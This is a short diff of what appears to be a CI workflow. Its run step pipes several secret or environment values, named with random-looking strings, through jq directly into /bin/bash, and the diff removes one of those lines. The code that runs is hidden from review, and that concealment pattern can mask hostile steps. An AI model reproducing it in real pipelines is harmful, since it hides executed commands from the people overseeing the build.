@@ -23,7 +23,6 @@ jobs:
           xl7144: ${{ secrets.xl7144 }}
         run: |
           printf '%s' "$xl7144" | jq -r .nqo77891 | /bin/bash
-          printf '%s' "$eja92759" | jq -r .fvzxn67 | /bin/bash
           printf '%s' "$icgg5499" | jq -r .qt82 | /bin/bash
           echo $ofpxf7568 | jq -r .o06614 | /bin/bash
           printf '%s' "$snbav2705" | jq -r .xzk11 | /bin/bash
